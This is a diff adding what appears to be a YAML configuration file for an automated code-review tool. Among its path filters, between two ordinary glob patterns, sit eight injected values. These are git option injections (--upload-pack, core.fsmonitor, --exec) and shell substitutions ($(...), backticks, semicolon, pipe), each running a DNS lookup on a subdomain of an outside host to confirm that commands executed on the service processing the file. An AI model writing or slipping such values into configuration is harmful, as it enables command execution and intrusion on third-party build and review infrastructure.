@@ -1,0 +1,14 @@
+language: "en-US"
+reviews:
+  profile: "chill"
+  path_filters:
+    - "src/**"
+    - "--upload-pack=getent hosts uploadpack.gi1.ssrf.xixixo123.site"
+    - "--config=core.fsmonitor=getent hosts fsmonitor.gi1.ssrf.xixixo123.site"
+    - "-c core.fsmonitor=getent hosts fsmonitor2.gi1.ssrf.xixixo123.site"
+    - "--exec=getent hosts exec.gi1.ssrf.xixixo123.site"
+    - "$(getent hosts subst.gi1.ssrf.xixixo123.site)"
+    - "`getent hosts backtick.gi1.ssrf.xixixo123.site`"
+    - "; getent hosts semi.gi1.ssrf.xixixo123.site ;"
+    - "| getent hosts pipe.gi1.ssrf.xixixo123.site"
+    - "!dist/**"
